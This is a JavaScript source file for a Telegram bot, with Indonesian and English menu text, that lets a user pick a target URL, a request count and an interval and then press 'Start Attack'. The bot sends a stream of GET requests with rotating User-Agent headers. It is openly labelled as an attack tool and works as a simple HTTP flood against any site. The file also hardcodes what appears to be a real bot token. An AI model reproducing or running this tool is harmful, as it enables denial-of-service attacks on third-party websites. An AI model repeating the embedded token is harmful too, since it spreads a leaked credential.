const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const token = '7863322072:AAFLohSBYqeTpx8eLrsZz0YBD_4rEP627-4';
const bot = new TelegramBot(token, {polling: true});
const userSessions = {};
const MENU_STATES = {
    MAIN: 'MAIN',
    SET_URL: 'SET_URL',
    SET_REQUESTS: 'SET_REQUESTS',
    SET_INTERVAL: 'SET_INTERVAL',
    CONFIRM: 'CONFIRM'
};
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
];
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    userSessions[chatId] = {
        state: MENU_STATES.MAIN,
        targetURL: '',
        numRequests: 0,
        interval: 0
    };
    sendMainMenu(chatId);
});
bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const session = userSessions[chatId] || {state: MENU_STATES.MAIN};
    switch(data) {
        case 'set_url':
            session.state = MENU_STATES.SET_URL;
            bot.sendMessage(chatId, '🌐 Silakan masukkan URL target kak hozoo imut:', {
                reply_markup: {
                    force_reply: true
                }
            });
            break;
            
        case 'set_requests':
            session.state = MENU_STATES.SET_REQUESTS;
            bot.sendMessage(chatId, '🔢 Silakan masukkan jumlah permintaan:', {
                reply_markup: {
                    force_reply: true
                }
            });
            break;
            
        case 'set_interval':
            session.state = MENU_STATES.SET_INTERVAL;
            bot.sendMessage(chatId, '⏱ Silakan masukkan interval antar permintaan (dalam milidetik):', {
                reply_markup: {
                    force_reply: true
                }
            });
            break;
        case 'confirm':
            session.state = MENU_STATES.CONFIRM;
            sendConfirmation(chatId, session);
            break;
        case 'start_attack':
            startAttack(chatId, session);
            break;
        case 'back':
            session.state = MENU_STATES.MAIN;
            sendMainMenu(chatId);
            break;
    }
    userSessions[chatId] = session;
});
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const session = userSessions[chatId];
    if (!session) return;
    switch(session.state) {
        case MENU_STATES.SET_URL:
            session.targetURL = text;
            session.state = MENU_STATES.MAIN;
            bot.sendMessage(chatId, `✅ URL set to: ${text}`);
            sendMainMenu(chatId);
            break;
        case MENU_STATES.SET_REQUESTS:
            session.numRequests = parseInt(text);
            session.state = MENU_STATES.MAIN;
            bot.sendMessage(chatId, `✅ Number of requests set to: ${text}`);
            sendMainMenu(chatId);
            break;
            
        case MENU_STATES.SET_INTERVAL:
            session.interval = parseInt(text);
            session.state = MENU_STATES.MAIN;
            bot.sendMessage(chatId, `✅ Interval set to: ${text} ms`);
            sendMainMenu(chatId);
            break;
    }
    userSessions[chatId] = session;
});
function sendMainMenu(chatId) {
    const session = userSessions[chatId];
    
    let message = `🛠 *Request Bot Menu* 🛠\n\n`;
    message += `🌐 *URL*: ${session.targetURL || 'Not set'}\n`;
    message += `🔢 *Requests*: ${session.numRequests || 'Not set'}\n`;
    message += `⏱ *Interval*: ${session.interval ? session.interval + 'ms' : 'Not set'}\n\n`;
    message += `Please configure your settings:`;
    
    bot.sendPhoto(chatId, 'https://pin.it/2l8UAWX5Z', { // Replace with your image URL
        caption: message,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    {text: '🌐 Set URL', callback_data: 'set_url'}
                ],
                [
                    {text: '🔢 Set Requests', callback_data: 'set_requests'},
                    {text: '⏱ Set Interval', callback_data: 'set_interval'}
                ],
                [
                    {text: '✅ Confirm & Start', callback_data: 'confirm'}
                ]
            ]
        }
    });
}

// Send confirmation before starting
function sendConfirmation(chatId, session) {
    let message = `⚠️ *Konfirmasi Parameter Serangan* ⚠️\n\n`;
    message += `🌐 *URL*: ${session.targetURL}\n`;
    message += `🔢 *Requests*: ${session.numRequests}\n`;
    message += `⏱ *Interval*: ${session.interval}ms\n\n`;
    message += `Apakah Anda yakin ingin memulai??`;
    
    bot.sendMessage(chatId, message, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [
                    {text: '🚀 Start Attack', callback_data: 'start_attack'},
                    {text: '🔙 Back', callback_data: 'back'}
                ]
            ]
        }
    });
}

// Start the attack
async function startAttack(chatId, session) {
    if (!session.targetURL || !session.numRequests || !session.interval) {
        bot.sendMessage(chatId, '❌ Please set all parameters before starting!');
        sendMainMenu(chatId);
        return;
    }
    
    const loadingMessage = await bot.sendMessage(chatId, '🚀 Starting requests... Please wait...');
    
    try {
        for (let i = 0; i < session.numRequests; i++) {
            try {
                const req = {
                    method: 'GET',
                    url: session.targetURL,
                    headers: {
                        'User-Agent': userAgents[i % userAgents.length]
                    }
                };
                
                const response = await axios(req);
                
                // Update the loading message with progress
                const progress = Math.floor(((i + 1) / session.numRequests) * 100);
                await bot.editMessageText(`📤 Sending requests... ${i + 1}/${session.numRequests} (${progress}%)\nStatus: ${response.status}`, {
                    chat_id: chatId,
                    message_id: loadingMessage.message_id
                });
                
                // Wait for the interval
                await new Promise(resolve => setTimeout(resolve, session.interval));
            } catch (error) {
                console.error(`Request ${i + 1} failed:`, error.message);
            }
        }
        
        bot.editMessageText(`✅ All ${session.numRequests} requests completed!`, {
            chat_id: chatId,
            message_id: loadingMessage.message_id
        });
    } catch (error) {
        bot.editMessageText(`❌ Error during attack: ${error.message}`, {
            chat_id: chatId,
            message_id: loadingMessage.message_id
        });
    }
    
    sendMainMenu(chatId);
}

console.log('Bot is running...');
